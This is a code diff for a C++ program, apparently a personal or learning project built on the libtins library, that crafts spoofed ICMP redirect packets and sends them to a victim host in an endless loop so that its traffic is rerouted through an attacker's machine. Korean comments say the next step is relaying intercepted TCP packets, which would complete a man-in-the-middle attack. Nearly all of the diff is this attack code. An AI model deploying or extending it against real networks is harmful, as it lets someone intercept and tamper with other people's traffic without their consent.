@@ -1,21 +1,26 @@
-
 #define TINS_STATIC
 #include <tins/tins.h>
 #include <iostream>
 #include <string>
 #include <stdexcept>
 #include <cstdlib>
+#include <string>
 #ifdef _WIN32
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #else
 #include <unistd.h>
 #endif // _WIN32
+using namespace std;
 using namespace Tins;
 using std::cout;
 using std::runtime_error;
 using std::endl;
 
+
+//다음 진행 : relay
+//윈도우 7이상은 라우터 테이블에 리다이렉트 경로를 따로 지정하지 않음으로 계속적으로 보내주어야 한다.
+//TCP 가 오면 그 패킷을 relay 시켜주는 작업진행
 
 
 void icmp_redirect(NetworkInterface iface,IPv4Address gw, IPv4Address attack, IPv4Address victim, IPv4Address webip,const NetworkInterface::Info& info)
@@ -27,14 +32,12 @@ void icmp_redirect(NetworkInterface iface,IPv4Address gw, IPv4Address attack, IP
 	cout << " Using victim hw address:  " << victim_hw << "\n";
 	cout << " Using own hw address:     " << info.hw_addr << "\n";
 	ICMP icmp;
-
-
-	icmp.set_redirect(1, attack);
-	//문제점은 와이어샤크에서 icmp gate way가 꺼꾸로 출력되어져있음?
-	//network byte가 아닌듯.. 그냥 들어가는거 같음.
-	//다른것들은 제대로 변환되서 들어가는데 왜 이것만???
-
-	EthernetII do_icmp = EthernetII(victim_hw, attack_hw) / IP(victim, gw) / icmp; // + 8바이트추가
+	icmp.set_redirect(1, (IPv4Address)htonl(attack));
+	cout << icmp.gateway() << endl;
+	uint8_t *a;
+	a =(uint8_t *)malloc(8);
+	memset(a, NULL,8);	
+	EthernetII do_icmp = EthernetII(victim_hw, attack_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(a, 8);
 	
 	while (true) {
 		sender.send(do_icmp, iface);
